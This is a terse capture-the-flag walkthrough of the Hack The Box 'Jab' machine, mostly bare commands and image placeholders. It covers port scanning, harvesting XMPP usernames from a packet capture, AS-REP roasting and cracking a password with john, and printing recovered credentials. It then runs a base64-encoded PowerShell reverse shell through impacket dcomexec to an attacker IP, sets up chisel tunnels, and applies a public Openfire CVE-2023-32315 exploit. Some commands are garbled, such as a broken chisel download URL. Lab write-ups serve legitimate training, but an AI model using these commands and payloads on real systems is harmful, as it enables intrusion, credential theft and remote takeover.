https://medium.com/@Vendetta0/jab-htb-writeup-104ca371e8a0

Recon & Enumeration

rustscan -r 1-65535 -a 10.10.11.4 -- -sV -Pn -A

![[Jab image.png]]

![[Jab image 1.png]]

![[Jab image 2.png]]

![[Jab image 3.png]]

![[Jab image 4.png]]

![[Jab image 5.png]]

![[Jab image 6.png]]

![[Jab image 7.png]]

![[Jab image 8.png]]

![[Jab image 9.png]]

![[Jab image 10.png]]

nmap -p- -Pn -min-rate 10000 10.10.11.4

![[Jab image 11.png]]

smbclient -L //10.10.11.4

![[Jab image 12.png]]

nothing

dnsenum jab.htb

![[Jab image 13.png]]

nothing

smbmap -H 10.10.11.4

nothing

**Users Enumeration** **& Export**

5222 jabber

spark(client app)

https://igniterealtime.org/projects/spark/?source=post_page-----104ca371e8a0--------------------------------

dpkg -i spark_3_0_2.deb

![[Jab image 14.png]]

![[Jab image 15.png]]

![[Jab image 16.png]]

![[Jab image 17.png]]

tcpdump

tcpdump -i tun0 -w spark.pcap

![[Jab image 18.png]]

![[Jab image 19.png]]

cat spark.pcap | grep -aE '@' | strings > output.txt

![[Jab image 20.png]]

vim extractUsers.py

import re

pattern = r'\<field var="Username">\<value>(.*?)\</value>\</field>'

with open('output.txt', 'r') as f:

contents = f.read()

matches = re.findall(pattern, contents)

for match in matches:

print(match)

![[Jab image 21.png]]

python extractUsers.py > usernames.txt

cat  usernames.txt > output.txt

git clone https://github.com/fortra/impacket.git

python3 impacket/examples/GetNPUsers.py jab.htb/ -dc-ip 10.10.11.4 -usersfile usernames.txt -format john -outputfile hashes.txt

![[Jab image 22.png]]

![[Jab image 23.png]]

jmontgomery@JAB.HTB

![[Jab image 24.png]]

lbradford@JAB.HTB

![[Jab image 25.png]]

mlowe@JAB.HTB

john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

![[Jab image 26.png]]

Midnight_121     ($krb5asrep$jmontgomery@JAB.HTB)

![[Jab image 27.png]]

![[Jab image 28.png]]

ID:svc_openfire

PW:!@#$%^&*(1qazxsw

https://wadcoms.github.io/wadcoms/Impacket-DCOMExec/?source=post_page-----104ca371e8a0--------------------------------

https://revshells.com

python3 impacket/examples/dcomexec.py -object MMC20 jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.10.11.4  '

powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAyADAAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

' -silentcommand

![[Jab image 29.png]]

![[Jab image 30.png]]

![[Jab image 31.png]]

![[Jab image 32.png]]

Privilege Escalation

chisel

apt install chisel

wget https://github.com//chisel/reveases/

![[Jab image 33.png]]

Victim

certutil.exe -urlcache -f http://127.0.0.1:9090

Attack

chisel server -p 8050 --reverse

![[Jab image 34.png]]

Victim

curl http://10.10.14.120:8000/chisel_1.9.1_windows_amd64 -o chisel.exe

![[Jab image 35.png]]

./chisel.exe client 10.10.14.120:8050 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091

![[Jab image 36.png]]

Attack

![[Jab image 37.png]]

http://localhost:9090

![[Jab image 38.png]]

ID:svc_openfire

PW:!@#$%^&*(1qazxsw

![[Jab image 39.png]]

is Adminisrator? Yes

https://github.com/miko550/CVE-2023-32315

git clone https://github.com/miko550/CVE-2023-32315

![[Jab image 40.png]]

![[Jab image 41.png]]

![[Jab image 42.png]]

PW:123

![[Jab image 43.png]]

![[Jab image 44.png]]

![[Jab image 45.png]]

43f7df5761f6e9fe5c7a85056bacf98e